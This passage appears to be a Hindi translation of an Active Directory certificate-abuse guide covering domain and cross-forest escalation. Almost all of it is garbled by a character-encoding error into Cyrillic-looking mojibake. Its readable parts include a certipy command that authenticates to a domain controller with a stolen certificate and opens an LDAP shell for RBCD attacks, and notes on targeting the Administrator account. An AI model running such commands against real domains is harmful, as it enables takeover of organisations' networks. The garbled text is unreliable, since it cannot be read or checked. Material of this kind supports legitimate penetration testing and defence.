рдкреНрд░рдореБрдЦ рдирд┐рдпрдВрддреНрд░рдХ рдХреЛ рдХреНрд╖рддрд┐ рдкрд╣реБрдВрдЪрд╛рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╡рд╛рд▓реЗ рд╕рдВрдХрдЯрд┐рдд рдЕрдзрд┐рдХрд╛рд░ рдЖрдзрд╛рд░рд┐рдд рдЕрдзрд┐рдХрд╛рд░ рджреЗрдиреЗ (RBCD) рд╣рдорд▓реЛрдВ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдЬреИрд╕реЗ рдЖрджреЗрд╢реЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ LDAP рд╢реИрд▓реА рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ `set_rbcd` рдЬреИрд╕реЗ рдХрдорд╛рдВрдбред
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
## рдбреЛрдореЗрди рдЙрдиреНрдирддрд┐

рдпрд╣ рдХрдордЬреЛрд░реА рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЗ рддрдХ рдлреИрд▓рддреА рд╣реИ рдЬрд┐рд╕рдореЗрдВ `userPrincipalName` рдЕрднрд╛рд╡ рд╣реИ рдпрд╛ рдЬрд┐рд╕рдореЗрдВ рдпрд╣ `sAMAccountName` рд╕реЗ рдореЗрд▓ рдирд╣реАрдВ рдЦрд╛рддрд╛, рдбрд┐рдлрд╝реЙрд▓реНрдЯ `Administrator@corp.local` рдХреЛ рдЙрдЪреНрдЪ LDAP рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдФрд░ рдПрдХ `userPrincipalName` рдХреЗ рдЕрднрд╛рд╡ рдХреЗ рдХрд╛рд░рдг рдореБрдЦреНрдп рд▓рдХреНрд╖реНрдп рдмрдирд╛рддрд╛ рд╣реИред


## рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╡рди рдЙрдиреНрдирддрд┐ рдХрд╛ рдЙрд▓реНрд▓реЗрдЦ рдкреИрд╕рд┐рд╡ рд╡реЙрдпрд╕ рдореЗрдВ рд╕рдордЭрд╛рдпрд╛ рдЧрдпрд╛

### рдХрдореНрдкреНрд░реЛрдорд╛рдЗрдЬреНрдб рд╕реАрдП рджреНрд╡рд╛рд░рд╛ рд╡рди рд╡рд┐рд╢реНрд╡рд╛рд╕ рдЯреНрд░рд╕реНрдЯ рдХрд╛ рдЯреВрдЯрдирд╛

**рдХреНрд░реЙрд╕-рд╡рди рдирд╛рдорд╛рдВрдХрди** рдХреЗ рд▓рд┐рдП рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдЕрдиреБрдХреВрд▓ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рд╕рдВрд╕рд╛рдзрдХ рджреНрд╡рд╛рд░рд╛ рд╕рдВрд╕рд╛рдзрди рд╡рди рд╕реЗ **рдореВрд▓ рд╕реАрдП рдкреНрд░рдорд╛рдгрдкрддреНрд░** рдХреЛ рдЦрд╛рддрд╛ рд╡рди рдореЗрдВ рдкреНрд░рдХрд╛рд╢рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдФрд░ рд╕рдВрд╕рд╛рдзрди рд╡рди рд╕реЗ рдЙрджреНрдпрдо рд╕реАрдП рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЛ рдкреНрд░рддреНрдпреЗрдХ рдЦрд╛рддрд╛ рд╡рди рдореЗрдВ `NTAuthCertificates` рдФрд░ AIA рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдЬреЛрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИред рд╕реНрдкрд╖реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдпрд╣ рд╡реНрдпрд╡рд╕реНрдерд╛ рд╕рдВрд╕рд╛рдзрди рд╡рди рдореЗрдВ рд╕реАрдП рдХреЛ рд╕рднреА рдЕрдиреНрдп рд╡рдиреЛрдВ рдкрд░ рдкреВрд░реНрдг рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИ рдЬрд┐рдирдХрд╛ рдкреНрд░рдмрдВрдзрди рдкреАрдХреЗрдЖрдИ рдХрд░рддрд╛ рд╣реИред рдпрджрд┐ рдпрд╣ рд╕реАрдП рд╣рдорд▓рд╛рд╡рд░реЛрдВ рджреНрд╡рд╛рд░рд╛ рдХрдореНрдкреНрд░реЛрдорд╛рдЗрдЬрд╝ рд╣реЛ рдЬрд╛рдП, рддреЛ рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ рдХреЛ рдЙрдирдХреЗ рджреНрд╡рд╛рд░рд╛ рдЬрд╛рд▓реА рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕рдХреЗ рдлрд▓рд╕реНрд╡рд░реВрдк рд╡рди рдХреА рд╕реБрд░рдХреНрд╖рд╛ рд╕реАрдорд╛ рдЯреВрдЯ рдЬрд╛рддреА рд╣реИред

### рд╡рд┐рджреЗрд╢реА рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓реНрд╕ рдХреЛ рдирд╛рдорд╛рдВрдХрди рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП

рдорд▓реНрдЯреА-рд╡рди рдкрд░рд┐рд╡реЗрд╢реЛрдВ рдореЗрдВ, рд╕рддрд░реНрдХрддрд╛ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдЬреЛ рдЙрджреНрдпрдо рд╕реАрдП рджреНрд╡рд╛рд░рд╛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдирдореВрдиреЗ рдкреНрд░рдХрд╛рд╢рд┐рдд рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ **рдкреНрд░рдорд╛рдгрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдпрд╛ рд╡рд┐рджреЗрд╢реА рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓реНрд╕** (рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛/рд╕рдореВрд╣ рдЬреЛ рдЙрджреНрдпрдо рд╕реАрдП рдХреЗ рд╡рди рд╕реЗ рдмрд╛рд╣рд░ рд╣реИрдВ) **рдирд╛рдорд╛рдВрдХрди рдФрд░ рд╕рдВрдкрд╛рджрди рдЕрдзрд┐рдХрд╛рд░** рджреЗрддреЗ рд╣реИрдВред\
рд╡рд┐рд╢реНрд╡рд╛рд╕ рдХреЗ рдПрдХ рджреБрдЖрд░рд╛рд╡рд╛рд░ рд╕реЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рдмрд╛рдж, рдПрдбреА рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдЯреЛрдХрди рдореЗрдВ **рдкреНрд░рдорд╛рдгрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ SID** рдЬреЛрдбрд╝ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рдХрд╛рд░, рдпрджрд┐ рдХрд┐рд╕реА рдбреЛрдореЗрди рдореЗрдВ рдПрдХ рдЙрджреНрдпрдо рд╕реАрдП рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ рдирд╛рдорд╛рдВрдХрди рдирдореВрдирд╛ рд╣реИ рдЬреЛ **рдкреНрд░рдорд╛рдгрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдорд╛рдВрдХрди рдЕрдзрд┐рдХрд╛рд░** рджреЗрддрд╛ рд╣реИ, рддреЛ рдПрдХ рдирд╛рдорд╛рдВрдХрди рдирдореВрдирд╛ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ **рдПрдХ рд╡рд┐рднрд┐рдиреНрди рд╡рди рд╕реЗ рдирд╛рдорд╛рдВрдХрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**ред рдЙрд╕реА рддрд░рд╣, рдпрджрд┐ рдПрдХ рдирд╛рдорд╛рдВрдХрди рдирдореВрдиреЗ рджреНрд╡рд╛рд░рд╛ рд╡рд┐рджреЗрд╢реА рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдХреЛ рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ рдирд╛рдорд╛рдВрдХрди рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ, рддреЛ рдПрдХ **рд╡рди рд╕реЗ рдПрдХ рдирд╛рдорд╛рдВрдХрди рдирд╛рдорд╛рдВрдХрди рд╕рдВрдмрдВрдз рд╕реНрдерд╛рдкрд┐рдд** рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдПрдХ рд╡рди рд╕реЗ рдПрдХ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдХреЛ **рдПрдХ рдирд╛рдорд╛рдВрдХрди рдирдореВрдирд╛ рдореЗрдВ рдирд╛рдорд╛рдВрдХрд┐рдд рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реЛрддреА рд╣реИ**ред

рджреЛрдиреЛрдВ рд╕реНрдерд┐рддрд┐рдпрд╛рдБ рдПрдХ рд╡рди рд╕реЗ рджреВрд╕рд░реЗ рд╡рди рдореЗрдВ рд╣рдорд▓реЗ рдХреА рд╕рддрд╣ рдореЗрдВ рд╡реГрджреНрдзрд┐ рдХрд░рддреА рд╣реИрдВред рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдирдореВрдиреЗ рдХреА рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рд╕реА рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рдПрдХ рд╡рд┐рджреЗрд╢реА рдбреЛрдореЗрди рдореЗрдВ рдЕрддрд┐рд░рд┐рдХреНрдд рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
